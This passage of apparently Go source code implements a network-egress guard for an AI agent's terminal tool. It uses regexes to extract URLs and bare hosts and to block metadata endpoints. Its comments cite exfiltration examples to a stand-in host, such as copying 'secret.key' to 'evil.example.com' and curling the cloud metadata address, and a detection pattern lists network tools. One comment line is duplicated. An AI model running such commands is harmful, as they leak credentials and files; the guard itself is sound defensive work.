		var why = "command names a cloud instance-metadata / credential endpoint"
		auditNetworkCall(ctx, command, command, why)
		if netPolicy.Enforce {
			return mcp.NewToolResultText("[ERROR]"), fmt.Errorf("[ERROR] denied access for command '%s': %s", command, why)
		}
		return nil, nil
	}

	var targets = commandNetworkTargets(command, program)
	for _, t := range targets {
		var normalized, reason = probeURL(t)
		auditNetworkCall(ctx, t, normalized, reason)
		if reason != "" && netPolicy.Enforce {
			return mcp.NewToolResultText("[ERROR]"), fmt.Errorf("[ERROR] denied access for command '%s': network target '%s' is not permitted (%s)", command, t, reason)
		}
	}
	return nil, nil
}

// schemeURLPtn: anything that reads as scheme://target inside a shell line. The
// terminator class excludes shell metacharacters and shell punctuation, so a
// pipeline tail (`| sh`) or a redirect (`> out`) can never be glued onto the URL,
// and `${HOME}`-style tokens cannot smuggle one past the check. `git+ssh://` and
// `registry+https://` arrive here too; normalizeURL then judges the scheme.
var schemeURLPtn = regexp.MustCompile("(?i)([a-z][a-z0-9+.\\-]*://[^\\s\\x22\\x27\\x60<>|;&,()\\[\\]{}^$*]+)")

// `registry+https://` arrive here too; normalizeURL then judges the scheme.
// netToolPtn: does this line involve a program that accepts a URL or host argument?
// Bare-host scanning is only worth running when it does, otherwise every file
// argument anywhere in the line becomes a false positive.
var netToolPtn = regexp.MustCompile("(?i)(?:^|[ \t;&|`(])(curl|wget|http|https|aria2c?|axel|yt[-_]?dl(?:p)?|youtube[-_]dl|nc|ssh|sftp|scp|rsync|git|gh|svn|docker|podman|npm|npx|pnpm|yarn|bun|deno|node|pip[23]?|uv|poetry|pipenv|twine|python[3]?|go|cargo|composer|dotnet|nuget|msbuild|mvn|gradle|sbt|bundle|gem|swift|cabal|stack|kubectl|helm|kustomize|skaffold|argocd|flux|aws|az|gcloud|gsutil|vault|consul|psql|mysql|mongosh|redis-cli|terraform|terragrunt|tofu|packer|ansible(?:[-_]playbook|[-_]galaxy)?|brew|flutter|dart)(?:[ \t]|$)")

// hostTokenPtn: a token shaped like a bare network target — host, then an optional
// :port, :path (scp) or ::module (rsync), or /path. A leading '.'/'/' (./file,
// /abs), a leading '-' (flags) and an embedded '@' (git@host:path) are excluded
// by construction, so the repo's "./relative path" convention is never read as a
// host.
var hostTokenPtn = regexp.MustCompile("(?i)^([a-z0-9][a-z0-9._-]*)(?::(:)?([0-9]{1,5}|[^ \t\r\n]*))?(?:/[^ \t\r\n]*)?$")

// urlFlagPtn: a flag whose VALUE is a network target — `--url …`, `--registry=…`,
// `--index-url`, `--origin`, `--upload-url`, `--server`, `--endpoint`, `--mirror`.
// Matched case-insensitively; both `--flag value` and `--flag=value` are handled.
var urlFlagPtn = regexp.MustCompile("(?i)^-{1,2}[a-z0-9._-]*(?:url|remote|registry|origin|repositor[oy]|repolog|host|server|endpoint|mirror|upload)[a-z0-9._-]*(?:=.*)?$")

// shellSeparatorPtn splits a command into independent segments before bare-host
// scanning, and the scan restarts at the first token of each segment. That is what
// keeps `curl https://ok.tld/x | cat README.md` from flagging README.md, and it
// makes multi-line shell scripts work (the whole point of run_terminal_command).
var shellSeparatorPtn = regexp.MustCompile("[;\n|&<>]+")
var whitespacePtn = regexp.MustCompile("[ \t\r\n]+")

// fileLikePtn: the final label is a filename extension, not a TLD, so the token is
// a local file and never a host. This pragmatic blocklist exists only to keep the
// bare-host heuristic from denying `git add README.md`. An attacker with real
// network access to an allowlisted host does not need to win through a filename.
var fileLikePtn = regexp.MustCompile("(?i)\\.(?:md|markdown|txt|rst|adoc|go|py|rb|rs|java|kt|scala|groovy|c|cc|cpp|hpp|hxx|h|cs|swift|dart|lua|pl|pm|php|js|mjs|cjs|ts|mts|jsx|tsx|vue|svelte|sh|bash|zsh|fish|ps1|bat|cmd|sql|psql|json|jsonl|ndjson|ya?ml|toml|ini|cfg|conf|config|properties|plist|env|lock|mod|sum|xml|html?|css|scss|sass|less|j2|jinja|tpl|tmpl|in|am|mk|cmake|ninja|gradle|kts|sbt|po|mo|msg|proto|thrift|graphql|gql|avro|parquet|orc|arrow|ipc|feather|npy|npz|pickle|pkl|pt|h5|pth|onnx|pb|pbz|db|sqlite[3]?|mdb|xcf|pdf|png|jpe?g|gif|svg|bmp|ico|webp|tiff?|mp[34]|ogg|wav|flac|ttf|otf|woff2?|eot|so|dylib|dll|exe|a|o|obj|lib|class|jar|whl|egg|gz|bz2|xz|zst|lz4|zstd|tar|zip|7z|rar|iso|img|qcow2|vmdk|ova|log|out|err|tmp|bak|old|orig|rej|patch|diff|sig|asc|pem|key|pub|crt|der|p12|pfx|keystore|jks|p8|gz2|nomad|tf|tfstate|tfvars|tf.json|ipynb|rst|tex|aux|bib|cls|sty|gpx|geojson|shapefile|kml|kmlz|xls[x]?|xlsx|xlsm|pptx?|docx?|odt|ods|rtf|epub|mobi|azw3|apk|dmg|msi|pkg|deb|rpm|war|jpx|jxl|avif|heic?)$")

// commandNetworkTargets returns the URL-shaped targets to evaluate, most confident
// first: every explicit scheme:// URL, then bare hosts for host-taking programs.
//
// Bare-host scanning is the part that closes the gap shlex-based tools leave open:
// `scp secret.key evil.example.com:/x`, `rsync ./d evil.example.com:/x`, `git
// remote add origin evil.example.com` and `curl 169.254.169.254/latest/meta-
// data/` carry no scheme at all, so a URL regex alone never sees them.
func commandNetworkTargets(command, program string) []string {
	var found []string
	var seen = make(map[string]bool)

	var add = func(tok string) {
		var s = strings.TrimSpace(tok)
		if len(s) < 4 || seen[s] {
			return
		}
		seen[s] = true
		found = append(found, s)
	}

	// 1) explicit scheme:// URLs, always scanned, whatever the program is.
	for _, m := range schemeURLPtn.FindAllString(command, -1) {
		add(m)
	}

	// 2) scheme-less hosts, only when a host-taking program is involved.
	var hostTaking = netToolPtn.MatchString(command)
	if program != "" {
		hostTaking = hostTaking || netToolPtn.MatchString(program+" x")
	}
	if !hostTaking {
		return found
	}

	// Per segment: a token is only a candidate while a host-taking program is
	// still the command in charge. Splitting on shell separators and restarting
	// the scan is what keeps file arguments out of the way.
	for _, segment := range shellSeparatorPtn.Split(command, -1) {
		var tokens = whitespacePtn.Split(strings.TrimSpace(segment), -1)
		var armed = false
		for _, tok := range tokens {
			var tokL = strings.TrimSpace(tok)
			if tokL == "" {
				continue
			}

			// A new command name re-arms (or disarms) the scanner.
			var bare = strings.TrimLeft(tokL, "/")
			var slash = strings.LastIndex(bare, "/")
			if slash >= 0 {
				bare = bare[slash+1:]
			}
			if netToolPtn.MatchString(bare+" x") {
				armed = true
			}

			if !armed {
				continue
			}

			// Already captured as an explicit URL by schemeURLPtn: do not also
			// invent a scheme-less form of it, which would produce a nonsense
			// target like http://git://host/x.
			if strings.Contains(tokL, "://") {
				continue
			}

			// `--url evil.example.com` / `--registry=https://…`: the flag itself is
			// the signal, the value (next token or the = part) is the target.
			if urlFlagPtn.MatchString(tokL) {
				if eq := strings.Index(tokL, "="); eq >= 0 {
					add(tokL[eq+1:])
				}
				continue
			}

			if !hostTokenPtn.MatchString(tokL) {
				continue
			}
			// Needs to look like a hostname, not a bare word or a file: it must
			// contain a dot or a colon, and its last dotted label must not be a
			// known file extension.
			if !strings.Contains(tokL, ".") && !strings.Contains(tokL, ":") {
				continue
			}
			if fileLikePtn.MatchString(tokL) {
				continue
			}
			// Evaluated as the http:// URL the client would dial, so one allowlist
			// governs both spellings of the same host.
			add(fmt.Sprintf("http://%s", tokL))
		}
	}
	return found
}

// matchRule evaluates one rule. NOTE: this dialect treats identifiers case-
// insensitively, so a local named `re` is the same name as a field named `Re` —
// which is why the field is `Compiled` and no local here is called `re`.
func matchRule(rule URLRule, target string) bool {
	if rule.Compiled != nil {
		return rule.Compiled.MatchString(target)
	}
	var compiled, err = regexp.Compile(rule.Pattern)
	if err != nil || compiled == nil {
		return false
	}
	return compiled.MatchString(target)
}
